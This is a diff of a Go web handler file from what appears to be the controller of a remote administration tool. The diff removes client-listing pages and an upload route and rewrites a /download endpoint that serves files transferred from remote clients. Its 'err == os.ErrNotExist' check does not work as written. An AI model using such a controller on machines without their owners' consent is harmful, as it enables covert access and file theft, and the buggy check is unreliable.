@@ -1,10 +1,10 @@
 package main
 
 import (
-	"html/template"
 	"net/http"
+	"os"
+	"path"
 	"rat/command/log"
-	"rat/shared"
 )
 
 func setup(w http.ResponseWriter, r *http.Request) {
@@ -12,10 +12,6 @@ func setup(w http.ResponseWriter, r *http.Request) {
 }
 
 func init() {
-	funcMap := template.FuncMap{
-		"Version": func() string { return shared.Version },
-	}
-
 	handler := func(h http.Handler) http.HandlerFunc {
 		return func(w http.ResponseWriter, r *http.Request) {
 			setup(w, r)
@@ -23,54 +19,25 @@ func init() {
 		}
 	}
 
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		setup(w, r)
-		t := template.Must(template.New("index.template.html").Funcs(funcMap).ParseFiles("web/index.template.html", "web/head.template.html", "web/tail.template.html"))
-
-		err := t.Execute(w, &Clients)
-
-		if err != nil {
-			panic(err)
-		}
-	})
-	http.HandleFunc("/clients", func(w http.ResponseWriter, r *http.Request) {
-		setup(w, r)
-		t := template.Must(template.New("clients.template.html").Funcs(funcMap).ParseFiles("web/clients.template.html"))
-
-		err := t.Execute(w, &Clients)
-		if err != nil {
-			panic(err)
-		}
-	})
-
-	/* http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
-		setup(w, r)
-
-		dir := r.PostFormValue("directory")
-
-		file, header, err := r.FormFile("file")
-
-		if err != nil {
-			log.Println(err.Error())
-		}
-
-		id, _ := strconv.Atoi(r.PostFormValue("id"))
-		client := GetClient(id)
-
-		remote := dir + header.Filename
-		log.Println("Remote file:", remote)
-
-		err = StartTransfer(client, file, remote)
-		if err != nil {
-			log.Println("upload:", err.Error())
-		}
-	}) */
 	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
 		setup(w, r)
-		if file, ok := TempFiles[r.FormValue("key")]; ok {
-			w.Header().Set("Content-Disposition", "attachment; filename="+file.Name)
 
-			http.ServeFile(w, r, file.Path)
+		if t, ok := transfers[r.FormValue("key")]; ok {
+			if t.Download {
+				_, err := os.Stat(t.Local)
+				if err == os.ErrNotExist {
+					w.WriteHeader(404)
+					return
+				}
+
+				w.Header().Set("Content-Disposition", "attachment; filename="+path.Base(t.Remote))
+
+				http.ServeFile(w, r, t.Local)
+			} else {
+				w.WriteHeader(400)
+			}
+		} else {
+			w.WriteHeader(404)
 		}
 	})
 	http.Handle("/static/", handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static")))))
